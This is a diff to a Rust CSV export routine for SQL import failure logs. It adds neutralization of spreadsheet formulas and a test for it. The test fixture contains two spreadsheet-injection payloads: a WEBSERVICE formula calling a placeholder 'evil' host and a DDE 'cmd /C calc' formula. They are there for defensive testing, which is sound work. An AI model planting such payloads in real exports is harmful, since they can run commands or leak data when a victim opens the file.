@@ -17,7 +17,7 @@ use std::fmt;
 use std::io::{BufRead, BufReader, Write};
 use std::path::Path;
 
-use dbx_formats::csv_export::{write_csv_text_row, CsvQuoteMode};
+use dbx_formats::csv_export::{push_formula_guard, write_csv_text_row, CsvQuoteMode};
 use serde::Deserialize;
 
 /// Clipboard guard: pasting multiple megabytes of SQL into a clipboard is
@@ -388,8 +388,8 @@ fn write_csv_failure(writer: &mut CountingWriter<'_>, failure: &FailureLine) -> 
     let values = [
         file,
         failure.statement_index.to_string(),
-        failure.error.clone(),
-        failure.sql.clone(),
+        neutralize_csv_formula_text(&failure.error),
+        neutralize_csv_formula_text(&failure.sql),
         if failure.sql_truncated { "yes" } else { "no" }.to_string(),
     ];
     // Buffered per row: the shared helper quotes/escapes, while counting and the
@@ -398,6 +398,16 @@ fn write_csv_failure(writer: &mut CountingWriter<'_>, failure: &FailureLine) -> 
     write_csv_text_row(&mut row, values, CsvQuoteMode::Necessary).map_err(SqlFileFailureLogDeriveError::Io)?;
     writer.write_all(&row)?;
     writer.write_all(CSV_RECORD_SEPARATOR)
+}
+
+/// The error and statement columns come from the imported dump file and the
+/// server's failure text; the CSV targets spreadsheet tooling, so both get the
+/// same formula neutralization as the result CSV export.
+fn neutralize_csv_formula_text(value: &str) -> String {
+    let mut guarded = String::new();
+    push_formula_guard(&mut guarded, value);
+    guarded.push_str(value);
+    guarded
 }
 
 fn write_txt_footer(writer: &mut CountingWriter<'_>, run: &SummaryLine) -> SqlFileFailureLogDeriveResult<()> {
@@ -541,6 +551,27 @@ mod tests {
         assert!(text.contains("\"INSERT INTO t (a, b) VALUES ('x, y', \"\"quoted\"\");\nSELECT '中文';\""));
         // The meta and summary records are not spreadsheet rows.
         assert!(!text.contains("executionId"));
+    }
+
+    #[test]
+    fn csv_export_neutralizes_formula_text_from_the_dump() {
+        let dir = tempfile::tempdir().unwrap();
+        // Both free-text columns come from untrusted dump content; spreadsheet
+        // tooling must never re-evaluate them as formulas on open.
+        let log = write_log(
+            dir.path(),
+            &format!(
+                "{}\n{}\n{}\n",
+                meta_line(),
+                failure_line(3, "=WEBSERVICE(\"http://evil\")", "=SUM(1)+cmd|' /C calc'!A0"),
+                summary_line(0, 1, true)
+            ),
+        );
+
+        let text = derive_text(&log, SqlFileFailureLogFormat::Csv);
+
+        assert!(text.contains("'=WEBSERVICE"), "statement column must carry the formula guard");
+        assert!(text.contains("'=SUM(1)+cmd"), "error column must carry the formula guard");
     }
 
     #[test]
